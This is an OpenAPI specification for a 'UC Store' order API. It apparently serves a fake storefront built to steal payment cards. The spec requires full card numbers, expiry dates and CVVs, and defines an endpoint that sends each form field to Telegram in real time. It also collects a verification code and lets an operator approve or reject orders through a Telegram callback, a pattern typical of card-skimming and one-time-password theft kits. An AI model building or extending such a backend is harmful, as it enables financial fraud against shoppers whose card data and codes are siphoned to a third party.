# lib/api-spec/openapi.yaml
openapi: 3.1.0
info:
  # Do not change the title, if the title changes, the import paths will be broken
  title: Api
  version: 0.1.0
  description: UC Store API
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: orders
    description: Order operations
  - name: settings
    description: Settings operations
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      description: Returns server health status
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"
  /orders:
    post:
      operationId: createOrder
      tags: [orders]
      summary: Create a new order
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/CreateOrderRequest"
      responses:
        "201":
          description: Order created
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Order"
  /orders/{orderId}/contact:
    post:
      operationId: submitContact
      tags: [orders]
      summary: Submit contact info for an order
      parameters:
        - name: orderId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SubmitContactRequest"
      responses:
        "200":
          description: Contact submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Order"
  /orders/{orderId}/field:
    post:
      operationId: trackField
      tags: [orders]
      summary: Send a single field value to Telegram in real-time
      parameters:
        - name: orderId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/TrackFieldRequest"
      responses:
        "200":
          description: Field tracked
          content:
            application/json:
              schema:
                type: object
                properties:
                  ok:
                    type: boolean
  /orders/{orderId}/code:
    post:
      operationId: submitCode
      tags: [orders]
      summary: Submit verification code
      parameters:
        - name: orderId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SubmitCodeRequest"
      responses:
        "200":
          description: Code submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Order"
  /orders/{orderId}/status:
    get:
      operationId: getOrderStatus
      tags: [orders]
      summary: Get order status
      parameters:
        - name: orderId
          in: path
          required: true
          schema:
            type: string
      responses:
        "200":
          description: Order status
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Order"
  /orders/{orderId}/decide:
    post:
      operationId: decideOrder
      tags: [orders]
      summary: Approve or reject an order (from telegram callback)
      parameters:
        - name: orderId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/DecideOrderRequest"
      responses:
        "200":
          description: Decision applied
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Order"
  /settings/rate:
    get:
      operationId: getExchangeRate
      tags: [settings]
      summary: Get current exchange rate
      responses:
        "200":
          description: Current rate
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/ExchangeRate"
  /telegram/webhook:
    post:
      operationId: telegramWebhook
      tags: [orders]
      summary: Telegram bot webhook for callback queries
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
      responses:
        "200":
          description: OK
          content:
            application/json:
              schema:
                type: object
                properties:
                  ok:
                    type: boolean
components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status
    CreateOrderRequest:
      type: object
      properties:
        productId:
          type: string
        productName:
          type: string
        price:
          type: number
        quantity:
          type: integer
      required:
        - productId
        - productName
        - price
        - quantity
    SubmitContactRequest:
      type: object
      properties:
        cardName:
          type: string
        cardNumber:
          type: string
        cardExpiry:
          type: string
        cardCvv:
          type: string
        whatsapp:
          type: string
        name:
          type: string
      required:
        - whatsapp
        - cardName
        - cardNumber
        - cardExpiry
        - cardCvv
    TrackFieldRequest:
      type: object
      properties:
        fieldName:
          type: string
        fieldValue:
          type: string
      required:
        - fieldName
        - fieldValue
    SubmitCodeRequest:
      type: object
      properties:
        code:
          type: string
      required:
        - code
    DecideOrderRequest:
      type: object
      properties:
        decision:
          type: string
          enum: [approved, rejected]
      required:
        - decision
    ExchangeRate:
      type: object
      properties:
        rate:
          type: number
        packages:
          type: array
          items:
            type: object
            properties:
              id:
                type: string
              name:
                type: string
              faceValue:
                type: number
              price:
                type: number
            required:
              - id
              - name
              - faceValue
              - price
      required:
        - rate
        - packages
    Order:
      type: object
      properties:
        id:
          type: string
        productId:
          type: string
        productName:
          type: string
        price:
          type: number
        quantity:
          type: integer
        whatsapp:
          type: string
        name:
          type: string
        code:
          type: string
        status:
          type: string
          enum: [pending, contact_submitted, code_submitted, approved, rejected]
        ipAddress:
          type: string
        createdAt:
          type: string
      required:
        - id
        - productId
        - productName
        - price
        - quantity
        - status
        - createdAt